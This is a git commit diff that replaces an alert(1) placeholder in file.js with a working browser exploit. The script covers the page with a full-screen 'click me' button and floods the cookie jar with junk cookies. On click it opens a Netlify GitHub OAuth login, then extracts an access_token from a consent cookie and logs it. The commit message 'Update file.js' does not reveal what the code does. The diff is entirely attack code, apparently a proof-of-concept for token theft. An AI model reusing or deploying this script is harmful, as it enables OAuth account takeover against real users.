f58d79f7f53728c22bf39e0ac93619f7537ce54b
lmzkjmiajzj-lgtm <lmzkjmiajzj@gmail.com>
2026-08-27 21:13:31 +0100

    Update file.js

--- file.js
+++ file.js
@@ -1,1 +1,16 @@
-alert(1)
+
+  document.write('<button id="p" style="position:fixed;inset:0;width:100vw;height:100vh;border:0;background:#fff;color:#000;font-size:48px;cursor:pointer">click me</button>');
+  for (var i = 0, prev = -1; i < 400; i++) {
+    document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
+    var v = document.cookie.split(/; */).length;
+    if (v === prev) break;
+    prev = v;
+  }
+  document.getElementById('p').onclick = function () {
+    window.open('https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true', '_blank');
+    setTimeout(function () {
+      var t = (document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
+      t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
+      console.log(t);
+    }, 10000);
+  };
